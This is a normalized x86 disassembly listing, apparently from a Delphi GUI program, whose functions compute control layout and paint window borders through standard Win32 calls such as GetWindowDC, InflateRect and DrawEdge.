call ScreenToClient
sub_43bcb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_416b18
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_4169bc
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403360
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43bd10
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43be06
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403360
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43be0d
mov eax [ ebp - 0x14 ]
call sub_403164
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_416b74
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_416b18
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403360
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43be1c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43bd10
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43be48
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44bae0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43bd10
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43bd10
mov edx eax
mov eax esi
call sub_44f74c
sub_43be8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43bed4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43b590
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43537c
sub_43bf1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43bfa0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43bbec
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_438618
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43c362
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_438618
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43bf1c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43c379
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43bfa0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_436150
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43c3b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_436fd4
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_434a74
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43c400
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4371f4
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43c430
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_438180
xor ecx ecx
push ebp
push sub_43c55f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_438618
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c566
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_438188
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4385dc
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43c566
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403360
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403360
jmp r-xdata
sub_43c5fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43c68c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43c8f2
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41fcf4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42b194
call sub_42b274
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42b194
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42b88c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43c934
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_434c50
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4391d4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_4362b4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_437478
sub_43c9a0
push ebx
push esi
mov esi edx
call sub_44bae0
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406990
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_4362b4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406990
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_4362b4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43ca04
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43959c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43ca3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43ca34
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43ca7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43420c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fe10
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_433ce8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43cad8
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4342e4
test bl bl
jle r-xdata
xor eax eax
call sub_4322dc
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_43cb18
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
